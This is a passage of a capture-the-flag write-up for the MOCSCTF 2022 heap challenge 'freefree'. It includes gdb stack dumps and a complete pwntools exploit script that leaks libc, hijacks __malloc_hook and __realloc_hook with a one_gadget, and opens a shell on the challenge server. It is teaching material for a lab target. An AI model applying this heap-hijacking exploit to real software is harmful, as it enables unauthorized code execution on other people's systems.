</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;__realloc_hook&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>And then we just malloc 2 chunk with the same size <code>0x2e0</code>, we will get the second chunk is <code>__realloc_hook</code> address:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">malloc(3, 0x2e0-0x10)
</span><span class="code-line">malloc(3, 0x2e0-0x10)
</span></code></pre></div>
<p>We can see the <code>__realloc_hook</code> address is saved on stack:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffcd4968f70│+0x0000: &quot;D=malloc(720)\n&quot;  ← $rax, $rsp, $rdi
</span><span class="code-line">0x00007ffcd4968f78│+0x0008: 0x00000a2930323728 (&quot;(720)\n&quot;?)
</span><span class="code-line">0x00007ffcd4968f80│+0x0010: 0x0000559462b382a0  →  0x0000000000000000    &lt;-- Chunk index 0
</span><span class="code-line">0x00007ffcd4968f88│+0x0018: 0x0000559462b5a020  →  0x0000000000000000    &lt;-- Chunk index 1
</span><span class="code-line">0x00007ffcd4968f90│+0x0020: 0x0000559462b7c020  →  0x0000000000000000    &lt;-- Chunk index 2
</span><span class="code-line">0x00007ffcd4968f98│+0x0028: 0x00007f6549689b68  →  0x00007f654953bbf0  →  &lt;realloc_hook_ini+0&gt; endbr64
</span><span class="code-line">0x00007ffcd4968fa0│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffcd4968fa8│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>So we successfully malloc with <code>__realloc_hook</code>. Now we just need to change value of <code>__realloc_hook</code> and <code>__malloc_hook</code> and that’s the easiest part in the world. Remember that we will write address of <code>realloc + 24</code> to <code>__malloc_hook</code> so it just pop, not push and the stack is remain until 6 <code>pop</code>, also the constraints is satisfied:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0xe6aee</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;realloc&#x27;</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Running script and stop before first <code>pop</code>, the stack look like this</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">0x00007ffc992c5ed0│+0x0000: 0x0000556efad732a0  →  0x0000000000000000    &lt;-- Chunk index 0
</span><span class="code-line">0x00007ffc992c5ed8│+0x0008: 0x0000556efad95020  →  0x0000000000000000    &lt;-- Chunk index 1
</span><span class="code-line">0x00007ffc992c5ee0│+0x0010: 0x0000556efadb7020  →  0x0000000000000000    &lt;-- Chunk index 2
</span><span class="code-line">0x00007ffc992c5ee8│+0x0018: 0x00007fa6716c4b68  →  0x00007fa6715bfaee  →  &lt;execvpe+638&gt; mov rdx, r12
</span><span class="code-line">0x00007ffc992c5ef0│+0x0020: 0x0000000000000000
</span><span class="code-line">0x00007ffc992c5ef8│+0x0028: 0x0000000000000000
</span><span class="code-line">0x00007ffc992c5f00│+0x0030: 0x0000000000000000
</span><span class="code-line">0x00007ffc992c5f08│+0x0038: 0x0000000000000000
</span></code></pre></div>
<p>The assembly code at pop look like this:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/10i $rip
</span><span class="code-line">=&gt; 0x7fa671577269 &lt;__GI___libc_realloc+617&gt;:  pop    rbx
</span><span class="code-line">   0x7fa67157726a &lt;__GI___libc_realloc+618&gt;:  pop    rbp
</span><span class="code-line">   0x7fa67157726b &lt;__GI___libc_realloc+619&gt;:  pop    r12
</span><span class="code-line">   0x7fa67157726d &lt;__GI___libc_realloc+621&gt;:  pop    r13
</span><span class="code-line">   0x7fa67157726f &lt;__GI___libc_realloc+623&gt;:  pop    r14
</span><span class="code-line">   0x7fa671577271 &lt;__GI___libc_realloc+625&gt;:  pop    r15
</span><span class="code-line">   0x7fa671577273 &lt;__GI___libc_realloc+627&gt;:  jmp    rax
</span></code></pre></div>
<p>Just 6 pop, if we increase the index of chunk a bit, we can get r12 and r15 null easily. So we will add a variable called <code>n</code> plus with all index to increase the index, this is more effective way than changing index one by one, it can make you confused.</p>
<p>For example, with the <code>gets(3, payload)</code> at the end, we will change it to <code>gets(3+n, payload)</code> and with n can be changed. I will choose <code>n=10</code> and new index will be 10, 11, 12, 13 and 14. That’s the perfect index and we now get the shell.</p>
<p>Full code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">import</span> subprocess
</span><span class="code-line"><span class="token keyword">import</span> time
</span><span class="code-line"><span class="token keyword">import</span> string
</span><span class="code-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line">
</span><span class="code-line">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#x27;./libc-2.31.so&#x27;</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&#x27;./freefree&#x27;</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># context.log_level = &#x27;debug&#x27;</span>
</span><span class="code-line">libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;one_gadget&#x27;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xe6aee</span>
</span><span class="code-line">libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;main_arena&#x27;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1ec1e0</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">getchar</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	<span class="token keyword">return</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}=malloc({})&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>getchar<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">gets</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;gets({})&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>getchar<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">	time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
</span><span class="code-line">	p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">puts</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b&#x27;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;puts({})&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>getchar<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token comment"># Receive data outside</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">GDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	command<span class="token operator">=</span><span class="token triple-quoted-string string">&#x27;&#x27;&#x27;
</span></span><span class="code-line"><span class="token triple-quoted-string string">	b*main+98
</span></span><span class="code-line"><span class="token triple-quoted-string string">	b*main+215
</span></span><span class="code-line"><span class="token triple-quoted-string string">	b*main+226
</span></span><span class="code-line"><span class="token triple-quoted-string string">	b*main+316
</span></span><span class="code-line"><span class="token triple-quoted-string string">	c
</span></span><span class="code-line"><span class="token triple-quoted-string string">	&#x27;&#x27;&#x27;</span>
</span><span class="code-line">	<span class="token comment"># b*sysmalloc</span>
</span><span class="code-line">	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#x27;/tmp/command.gdb&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;wt&#x27;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
</span><span class="code-line">	        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
</span><span class="code-line">	subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-e&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;gdb&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-p&#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#x27;-x&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;/tmp/command.gdb&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment"># input() to make program wait with gdb</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># p = process(&#x27;./freefree_patched&#x27;)</span>
</span><span class="code-line">p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">&#x27;34.136.108.210&#x27;</span><span class="token punctuation">,</span> <span class="token number">40007</span><span class="token punctuation">)</span>
</span><span class="code-line">n <span class="token operator">=</span> <span class="token number">10</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">########################################</span>
</span><span class="code-line"><span class="token comment">### Stage 1: Leak main arena address ###</span>
</span><span class="code-line"><span class="token comment">########################################</span>
</span><span class="code-line">log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#x27;Stage 1: Leak main arena address...&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># Malloc to control all next chunks</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Change top chunk size</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">0x10</span>    <span class="token comment"># chunk data</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">0x8</span>    <span class="token comment"># Prevsize</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xd51</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">+</span>n<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Trigger to free top chunl</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Malloc to get libc main arena address</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
</span><span class="code-line">puts<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span>n<span class="token punctuation">)</span>
</span><span class="code-line">libc_main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b&#x27;\x00\x00&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&#x27;Libc main_arena: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_main_arena<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_main_arena <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;main_arena&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&#x27;Libc main_arena: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">####################################</span>
</span><span class="code-line"><span class="token comment">### Stage 2: Free 2 small chunks ###</span>
</span><span class="code-line"><span class="token comment">####################################</span>
</span><span class="code-line">log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#x27;Stage 2: Free 2 small chunks...&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># First freed chunk</span>
</span><span class="code-line"><span class="token comment"># Change top chunk size to 0x20300</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Overwrite top chunk size to 0x300</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">8</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Trigger to free top chunk</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Second freed chunk</span>
</span><span class="code-line"><span class="token comment"># Change top chunk size to 0x20300</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Overwrite top chunk size to 0x300</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">8</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x301</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span>n<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment"># Trigger to free top chunk</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token comment">##########################</span>
</span><span class="code-line"><span class="token comment">### Stage 3: Get shell ###</span>
</span><span class="code-line"><span class="token comment">##########################</span>
</span><span class="code-line">log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#x27;Stage 3: Get shell...&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xcf0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">8</span>    <span class="token comment"># Prevsize</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x2e1</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;__realloc_hook&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span>n<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x2e0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x2e0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0xe6aee</span><span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;realloc&#x27;</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span>
</span><span class="code-line">gets<span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">+</span>n<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">+</span>n<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<h2 id="4-get-flag"><a href="#4-get-flag" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>4. Get flag</h2>
<p><img src="/static/images/mocsctf-2022/get_flag.png" alt="get_flag.png"/></p>
<p>Flag is <code>MOCSCTF{Fr33_@nd_Fr3E_1s_n07_3@5y}</code></p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Fmocsctf-2022%2Ffull-of-orange">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/mocsctf-2022/full-of-orange.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Originally published on</h2><div class="flex flex-wrap text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange">github.com</a></div></div><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/mocsctf-2022/">MOCSCTF-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pwn/">pwn</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/heap/">heap</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/shell/">Shell</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/overflow/">overflow</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/binary-exploit/">Binary-Exploit</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/dice-ctf-2022/vm-calc/">DICE CTF 2022 – vm-calc</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/ugra-ctf-quals-2022/symphony/">Ugra CTF Quals 2022 – Играет как умеет</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var d=Object.create;var l=Object.defineProperty;var 